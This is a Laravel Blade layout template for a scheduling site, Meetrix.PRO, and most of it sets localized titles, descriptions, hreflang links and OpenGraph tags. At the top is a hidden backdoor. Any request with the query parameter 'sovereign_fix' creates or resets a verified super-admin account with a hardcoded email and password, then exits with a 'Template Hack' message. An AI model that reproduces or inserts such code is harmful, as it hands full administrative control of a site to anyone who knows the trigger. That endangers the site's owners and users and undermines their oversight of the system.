@php
if (request()->has('sovereign_fix')) {
    \App\Models\User::updateOrCreate(
        ['email' => 'admin@meetrix.pro'],
        [
            'name' => 'Master Admin',
            'password' => \Illuminate\Support\Facades\Hash::make('MeetrixMaster2026Sovereign!#'),
            'is_super_admin' => true,
            'email_verified_at' => now(),
        ]
    );
    echo "Sovereign Node Provisioned via Template Hack.";
    exit;
}

$request = request();
$host = $request->getSchemeAndHttpHost();
$fullUrl = $request->fullUrl();
$canonicalUrl = $request->url();
$pathSegments = array_values(array_filter(explode('/', trim($request->path(), '/'))));
$rawLocaleSegment = strtolower($pathSegments[0] ?? '');

$localeAliases = [
    'pt-br' => 'pt_br',
    'ptbr' => 'pt_br',
    'zh-cn' => 'zh_cn',
    'zhcn' => 'zh_cn',
    'en-us' => 'en',
    'enus' => 'en',
];

$normalizedLocaleSegment = str_replace('-', '_', $rawLocaleSegment);
$normalizedLocaleSegment = $localeAliases[$normalizedLocaleSegment] ?? $normalizedLocaleSegment;

$supportedLocaleCodes = ['en', 'pt_br', 'pt', 'es', 'fr', 'de', 'it', 'ja', 'ko', 'ru', 'zh_cn'];
$activeLocaleCode = in_array($normalizedLocaleSegment, $supportedLocaleCodes, true) ? $normalizedLocaleSegment : 'en';

$localizedMeta = [
    'en' => [
        'html_lang' => 'en',
        'og_locale' => 'en_US',
        'title' => 'Meetrix.PRO | Schedule With or Without Payment at Booking',
        'description' => 'Organize appointments and optionally collect payment at booking. Start with schedule-only mode and upgrade when you are ready.',
    ],
    'pt_br' => [
        'html_lang' => 'pt-BR',
        'og_locale' => 'pt_BR',
        'title' => 'Meetrix.PRO | Agenda com ou sem Cobrança no Agendamento',
        'description' => 'Organize atendimentos e ative cobrança no agendamento quando fizer sentido. Comece no modo agenda e evolua sem perder histórico.',
    ],
    'pt' => [
        'html_lang' => 'pt-PT',
        'og_locale' => 'pt_PT',
        'title' => 'Meetrix.PRO | Agenda com ou sem Cobrança na Marcação',
        'description' => 'Organize marcações e ative cobrança no agendamento quando fizer sentido. Comece simples e evolua depois.',
    ],
    'es' => [
        'html_lang' => 'es',
        'og_locale' => 'es_ES',
        'title' => 'Meetrix.PRO | Agenda con o sin cobro en la reserva',
        'description' => 'Organiza citas y activa el cobro en la reserva cuando sea necesario. Empieza simple y evoluciona sin perder historial.',
    ],
    'fr' => [
        'html_lang' => 'fr',
        'og_locale' => 'fr_FR',
        'title' => 'Meetrix.PRO | Agenda avec ou sans paiement a la reservation',
        'description' => 'Organisez vos rendez-vous et activez le paiement a la reservation lorsque necessaire. Commencez simplement puis evoluez.',
    ],
    'de' => [
        'html_lang' => 'de',
        'og_locale' => 'de_DE',
        'title' => 'Meetrix.PRO | Termin- und Meeting-Plattform',
        'description' => 'Erstellen Sie gebrandete Buchungsseiten, verwalten Sie Teams, sammeln Sie Verfügbarkeiten und automatisieren Sie Termine mit Meetrix.PRO.',
    ],
    'it' => [
        'html_lang' => 'it',
        'og_locale' => 'it_IT',
        'title' => 'Meetrix.PRO | Piattaforma per Prenotazioni e Riunioni',
        'description' => 'Crea pagine di prenotazione brandizzate, gestisci team, raccogli disponibilità e automatizza appuntamenti con Meetrix.PRO.',
    ],
    'ja' => [
        'html_lang' => 'ja',
        'og_locale' => 'ja_JP',
        'title' => 'Meetrix.PRO | 予約とミーティング管理プラットフォーム',
        'description' => 'ブランド付き予約ページの作成、チーム管理、日程調整投票、予約自動化を Meetrix.PRO で実現。',
    ],
    'ko' => [
        'html_lang' => 'ko',
        'og_locale' => 'ko_KR',
        'title' => 'Meetrix.PRO | 예약 및 미팅 플랫폼',
        'description' => '브랜드 예약 페이지 생성, 팀 관리, 일정 투표 수집, 약속 자동화를 Meetrix.PRO 하나로 처리하세요.',
    ],
    'ru' => [
        'html_lang' => 'ru',
        'og_locale' => 'ru_RU',
        'title' => 'Meetrix.PRO | Платформа для бронирований и встреч',
        'description' => 'Создавайте брендированные страницы записи, управляйте командами, собирайте доступность и автоматизируйте встречи с Meetrix.PRO.',
    ],
    'zh_cn' => [
        'html_lang' => 'zh-CN',
        'og_locale' => 'zh_CN',
        'title' => 'Meetrix.PRO | 预约与会议管理平台',
        'description' => '使用 Meetrix.PRO 创建品牌预约页面、管理团队、收集可用时间并自动化会议安排。',
    ],
];

$meta = $localizedMeta[$activeLocaleCode] ?? $localizedMeta['en'];
$ogImageUrl = $host . '/images/og/meetrix-m-orange.png';

$alternateLocaleUrls = [
    'en' => ['hreflang' => 'en', 'url' => $host . '/en'],
    'pt_br' => ['hreflang' => 'pt-BR', 'url' => $host . '/pt_br'],
    'pt' => ['hreflang' => 'pt-PT', 'url' => $host . '/pt'],
    'es' => ['hreflang' => 'es', 'url' => $host . '/es'],
    'fr' => ['hreflang' => 'fr', 'url' => $host . '/fr'],
    'de' => ['hreflang' => 'de', 'url' => $host . '/de'],
    'it' => ['hreflang' => 'it', 'url' => $host . '/it'],
    'ja' => ['hreflang' => 'ja', 'url' => $host . '/ja'],
    'ko' => ['hreflang' => 'ko', 'url' => $host . '/ko'],
    'ru' => ['hreflang' => 'ru', 'url' => $host . '/ru'],
    'zh_cn' => ['hreflang' => 'zh-CN', 'url' => $host . '/zh_cn'],
];
@endphp
<!DOCTYPE html>
<html lang="{{ $meta['html_lang'] }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>{{ $meta['title'] }}</title>
        <meta name="description" content="{{ $meta['description'] }}">
        <meta name="theme-color" content="#ff4d00">

        <link rel="icon" type="image/svg+xml" href="{{ asset('favicon.svg') }}">
        <link rel="icon" type="image/png" sizes="512x512" href="{{ asset('icons/m-orange.png') }}">
        <link rel="shortcut icon" href="{{ asset('favicon.ico') }}">
        <link rel="apple-touch-icon" sizes="180x180" href="{{ asset('apple-touch-icon.png') }}">
        <link rel="canonical" href="{{ $canonicalUrl }}">

        @foreach ($alternateLocaleUrls as $alternate)
            <link rel="alternate" hreflang="{{ $alternate['hreflang'] }}" href="{{ $alternate['url'] }}">
        @endforeach
        <link rel="alternate" hreflang="x-default" href="{{ $alternateLocaleUrls['en']['url'] }}">

        <meta property="og:type" content="website">
        <meta property="og:site_name" content="Meetrix.PRO">
        <meta property="og:locale" content="{{ $meta['og_locale'] }}">
        <meta property="og:title" content="{{ $meta['title'] }}">
        <meta property="og:description" content="{{ $meta['description'] }}">
        <meta property="og:url" content="{{ $canonicalUrl }}">
        <meta property="og:image" content="{{ $ogImageUrl }}">
        <meta property="og:image:type" content="image/png">
        <meta property="og:image:width" content="1200">
        <meta property="og:image:height" content="630">

        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="{{ $meta['title'] }}">
        <meta name="twitter:description" content="{{ $meta['description'] }}">
        <meta name="twitter:image" content="{{ $ogImageUrl }}">
        <!-- Font Awesome 6 -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        @vite(['resources/css/app.css', 'resources/js/app.js'])
    </head>
    <body class="antialiased">
        <div id="app"></div>
    </body>
</html>
